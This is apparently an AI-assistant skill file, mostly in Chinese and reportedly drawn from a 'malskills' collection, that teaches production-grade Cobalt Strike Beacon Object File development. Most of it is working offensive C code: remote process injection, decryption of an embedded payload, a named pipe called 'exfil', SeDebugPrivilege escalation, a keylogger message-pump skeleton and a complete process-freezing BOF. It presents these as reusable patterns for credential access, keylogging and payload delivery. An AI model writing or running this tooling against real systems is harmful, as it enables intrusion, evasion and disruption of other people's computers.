---
name: "c-bof"
description: ">"
---

# C Bof

*Sourced from killvxk-malskills-zh*

# C Beacon Object Files (BOF) Development

本技能遵循官方 [BOF Template](https://github.com/Cobalt-Strike/bof_template) 约定，生成生产级 BOF C 代码。
模式来源于涵盖进程注入 (process injection)、凭据访问、键盘记录、内存转储和加密 payload 投递的真实 BOF 案例。

## 适用场景

- 用户说 *"创建一个 BOF 来…"* 或 *"编写一个 BOF 用于…"*
- 将已有 C PoC 转换为 BOF
- 出现 `undefined reference to 'Beacon*'` 或 `.text section too large` 等错误
- 需要 DFR、堆管理、注入、嵌入式 payload、多模式 BOF 的模式

---

## 步骤 1 — 文件头约定

每个 BOF 源文件以结构化注释块开头：

```c
/**
 * @file       mybof.c
 * @brief      One-line description of the BOF.
 *
 * Technique:  Name of the technique / tradecraft
 * MITRE ATT&CK: T1055.001 (Process Injection: DLL Injection)
 * Target:     x86_64 Windows 10/11, Server 2016+
 *
 * Architecture notes:
 *   Describe the approach, data flow, and any multi-mode logic.
 *
 * References:
 *   - https://relevant-url-or-paper
 */
```

---

## 步骤 2 — DFR 声明（按模块分组）

按 DLL 分组并对齐格式。声明每一个使用的 Win32 调用：

```c
/* ── KERNEL32 ─────────────────────────────────────────── */
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$VirtualAllocEx(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$WriteProcessMemory(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateRemoteThread(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);

/* ── ADVAPI32 ─────────────────────────────────────────── */
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);

/* ── NTDLL ────────────────────────────────────────────── */
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);

/* ── MSVCRT ───────────────────────────────────────────── */
DECLSPEC_IMPORT int     __cdecl MSVCRT$_snprintf(char*, size_t, const char*, ...);
DECLSPEC_IMPORT int     __cdecl MSVCRT$_snwprintf(wchar_t*, size_t, const wchar_t*, ...);
DECLSPEC_IMPORT void*   __cdecl MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT void*   __cdecl MSVCRT$memset(void*, int, size_t);
```

> 分组顺序：KERNEL32 → ADVAPI32 → NTDLL → USER32 → MSVCRT → 其他。

---

## 步骤 3 — 堆管理

**禁止使用 `malloc`/`free`/`calloc`。** 通过 DFR 使用进程堆：

```c
HANDLE heap = KERNEL32$GetProcessHeap();
char* buf = (char*)KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, size);
if (!buf) {
    BeaconPrintf(CALLBACK_ERROR, "HeapAlloc failed");
    return;
}
/* ... use buf ... */
KERNEL32$HeapFree(heap, 0, buf);
```

对于由 Beacon 管理的格式化缓冲区，使用 `BeaconFormatAlloc`/`BeaconFormatFree`。

---

## 步骤 4 — 参数处理

参数由 CNA 的 `bof_pack()` 打包，并按确定顺序解析：

```c
datap parser;
BeaconDataParse(&parser, args, len);
int    mode  = BeaconDataInt(&parser);     /* i */
int    pid   = BeaconDataInt(&parser);     /* i */
char*  path  = BeaconDataExtract(&parser, NULL); /* z */
```

| 函数 | 返回值 | 打包字符 |
|----------|---------|-----------|
| `BeaconDataInt(&p)` | `int` | `i` |
| `BeaconDataShort(&p)` | `short` | `s` |
| `BeaconDataExtract(&p, &sz)` | `char*` | `z` / `Z` |
| `BeaconDataLength(&p)` | `int` | （长度前缀） |

---

## 步骤 5 — 编译

```bash
./scripts/build_bof.sh mybof.c
```

| 参数 | 用途 |
|------|---------|
| `-m64 -c` | 目标 x64，仅编译（不链接） |
| `-fno-asynchronous-unwind-tables` | 减少 `.eh_frame` 节体积 |
| `-fpack-struct=8` | 匹配 Beacon 的结构体对齐 |
| `-ffunction-sections -fdata-sections` | 允许节裁剪 |
| `-s` | 去除符号 |

---

## 高级模式

### 多模式 BOF

单个 BOF 通过模式整型处理多种操作：

```c
#define MODE_FREEZE   1
#define MODE_DUMP     2
#define MODE_UNFREEZE 3

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    int mode = BeaconDataInt(&parser);

    switch (mode) {
        case MODE_FREEZE:   do_freeze(&parser);   break;
        case MODE_DUMP:     do_dump(&parser);      break;
        case MODE_UNFREEZE: do_unfreeze(&parser);  break;
        default:
            BeaconPrintf(CALLBACK_ERROR, "Unknown mode: %d", mode);
    }
}
```

CNA 分发模式：`bof_pack($1, "ii", 1, $pid)`。

### 键值存储 — 跨调用状态持久化（CS 4.9+）

在同一 Beacon 会话的多次 BOF 调用之间持久化数据：

```c
#define KEY_HANDLE "myBof_handle"
#define KEY_STATE  "myBof_state"

/* Store */
BeaconAddValue(KEY_HANDLE, (char*)hProc);

/* Retrieve */
HANDLE hProc = (HANDLE)BeaconGetValue(KEY_HANDLE);
if (!hProc) {
    BeaconPrintf(CALLBACK_ERROR, "No stored handle — run mode 1 first");
    return;
}

/* Cleanup */
KERNEL32$CloseHandle(hProc);
BeaconRemoveValue(KEY_HANDLE);
```

> Beacon **不会**释放已存储的内存，BOF 必须自行管理生命周期。

### Ntdll 动态解析

当 DFR 不可用时（如未文档化的 Nt* 函数），在运行时动态解析：

```c
typedef NTSTATUS (NTAPI *fnNtSuspendProcess)(HANDLE);

HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
fnNtSuspendProcess pNtSuspendProcess =
    (fnNtSuspendProcess)KERNEL32$GetProcAddress(hNtdll, "NtSuspendProcess");

if (!pNtSuspendProcess) {
    BeaconPrintf(CALLBACK_ERROR, "Failed to resolve NtSuspendProcess");
    return;
}
NTSTATUS status = pNtSuspendProcess(hProcess);
```

### 进程注入模式

```c
LPVOID remoteBuf = KERNEL32$VirtualAllocEx(hProc, NULL, payloadSize,
                                           MEM_COMMIT | MEM_RESERVE,
                                           PAGE_READWRITE);
if (!remoteBuf) { BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx failed"); goto cleanup; }

KERNEL32$WriteProcessMemory(hProc, remoteBuf, payload, payloadSize, NULL);

/* Flip to RX (never leave RWX) */
DWORD oldProt;
KERNEL32$VirtualProtectEx(hProc, remoteBuf, payloadSize, PAGE_EXECUTE_READ, &oldProt);

HANDLE hThread = KERNEL32$CreateRemoteThread(hProc, NULL, 0,
    (LPTHREAD_START_ROUTINE)remoteBuf, NULL, 0, NULL);
```

### 嵌入式加密 payload

从生成的头文件中包含加密 blob：

```c
#include "payload.h"  /* enc_payload[], enc_key[], enc_nonce[], enc_payload_len */

static void secure_zero(void* ptr, size_t len) {
    volatile unsigned char* p = (volatile unsigned char*)ptr;
    while (len--) *p++ = 0;
}

/* Decrypt in-place, then zero key material */
decrypt_chacha20(enc_payload, enc_payload_len, enc_key, enc_nonce);
/* ... use payload ... */
secure_zero(enc_key, sizeof(enc_key));
secure_zero(enc_nonce, sizeof(enc_nonce));
```

### 命名管道 IPC

```c
wchar_t pipeName[128];
MSVCRT$_snwprintf(pipeName, 128, L"\\\\.\\pipe\\exfil_%d", targetPid);

HANDLE hPipe = KERNEL32$CreateNamedPipeW(pipeName,
    PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_WAIT,
    1, 0, BUFFER_SIZE, 0, NULL);

KERNEL32$ConnectNamedPipe(hPipe, NULL);
/* ReadFile loop → BeaconOutput */
```

### 错误处理辅助函数

```c
static void PrintWin32Error(const char* context) {
    DWORD err = KERNEL32$GetLastError();
    BeaconPrintf(CALLBACK_ERROR, "%s failed (error %lu / 0x%lX)", context, err, err);
}

static BOOL EnableDebugPrivilege(void) {
    HANDLE hToken;
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    ADVAPI32$LookupPrivilegeValueA(NULL, "SeDebugPrivilege",
                                    &tp.Privileges[0].Luid);
    BOOL ok = ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    KERNEL32$CloseHandle(hToken);
    return ok;
}
```

### 自定义结构体定义

当 SDK 头文件不可用时，手动定义结构体：

```c
#pragma pack(push, 1)
typedef struct _MY_SYSTEM_PROCESS_INFO {
    ULONG  NextEntryOffset;
    ULONG  NumberOfThreads;
    /* ... fields as needed ... */
    UNICODE_STRING ImageName;
    LONG   BasePriority;
    HANDLE UniqueProcessId;
} MY_SYSTEM_PROCESS_INFO, *PMY_SYSTEM_PROCESS_INFO;
#pragma pack(pop)
```

### 长时间运行的 BOF（消息泵）

对于无限期运行的 BOF（键盘记录器、监视器）：

```c
static BOOL g_running = TRUE;

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    if (msg == WM_DESTROY) { g_running = FALSE; return 0; }
    /* handle WM_INPUT, WM_CLIPBOARDUPDATE, etc. */
    return USER32$DefWindowProcW(hwnd, msg, wp, lp);
}

void go(char* args, int len) {
    (void)args; (void)len;  /* suppress unused param warnings */

    WNDCLASSW wc = {0};
    wc.lpfnWndProc   = WndProc;
    wc.lpszClassName  = L"BofWorker";
    wc.hInstance      = NULL;
    USER32$RegisterClassW(&wc);

    HWND hwnd = USER32$CreateWindowExW(0, L"BofWorker", NULL, 0,
        0, 0, 0, 0, HWND_MESSAGE, NULL, NULL, NULL);

    MSG msg;
    while (g_running && USER32$GetMessageW(&msg, NULL, 0, 0) > 0) {
        USER32$TranslateMessage(&msg);
        USER32$DispatchMessageW(&msg);
    }
}
```

---

## 完整示例 — process_freeze.c

```c
/**
 * @file       process_freeze.c
 * @brief      Freeze/unfreeze a target process by PID.
 *
 * Technique:  Process suspension via NtSuspendProcess/NtResumeProcess
 * MITRE ATT&CK: T1489 (Service Stop) — adapted for process control
 * Target:     x86_64 Windows 10+
 */

#include <windows.h>
#include "beacon.h"

#define MODE_FREEZE   1
#define MODE_UNFREEZE 2

/* ── KERNEL32 ─────────────────────────────────────────── */
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess(void);

/* ── ADVAPI32 ─────────────────────────────────────────── */
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);

typedef NTSTATUS (NTAPI *fnNtSuspendProcess)(HANDLE);
typedef NTSTATUS (NTAPI *fnNtResumeProcess)(HANDLE);

static BOOL EnableDebugPrivilege(void) {
    HANDLE hToken;
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    ADVAPI32$LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid);
    BOOL ok = ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    KERNEL32$CloseHandle(hToken);
    return ok;
}

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    int mode = BeaconDataInt(&parser);
    int pid  = BeaconDataInt(&parser);

    EnableDebugPrivilege();

    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    fnNtSuspendProcess pSuspend = (fnNtSuspendProcess)KERNEL32$GetProcAddress(hNtdll, "NtSuspendProcess");
    fnNtResumeProcess  pResume  = (fnNtResumeProcess)KERNEL32$GetProcAddress(hNtdll, "NtResumeProcess");

    HANDLE hProc = KERNEL32$OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
    if (!hProc) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcess(%d) failed", pid);
        return;
    }

    NTSTATUS status;
    if (mode == MODE_FREEZE) {
        status = pSuspend(hProc);
        BeaconPrintf(status == 0 ? CALLBACK_OUTPUT : CALLBACK_ERROR,
                     "[%s] PID %d — NTSTATUS 0x%08X",
                     status == 0 ? "FROZEN" : "FAIL", pid, status);
    } else if (mode == MODE_UNFREEZE) {
        status = pResume(hProc);
        BeaconPrintf(status == 0 ? CALLBACK_OUTPUT : CALLBACK_ERROR,
                     "[%s] PID %d — NTSTATUS 0x%08X",
                     status == 0 ? "RESUMED" : "FAIL", pid, status);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Unknown mode: %d", mode);
    }

    KERNEL32$CloseHandle(hProc);
}
```

---

## 支持文件

| 文件 | 描述 |
|------|-------------|
| `scripts/bof_template.c`           | 生产级 BOF 骨架代码 |
| `scripts/build_bof.sh`             | 带优化参数的编译器封装脚本 |
| `scripts/extract_arguments.py`     | 解析并格式化输出 BOF 参数包 |
| `references/REFERENCE.md`          | 完整 Beacon API 参考（CS 4.12）及错误码表 |
| `assets/beacon.h`                  | Cobalt Strike 官方 Beacon 头文件（CS 4.12） |
| `assets/beacon_compatibility.h`    | 便捷宏、缺失的 mingw 类型定义（LUID、NTSTATUS） |

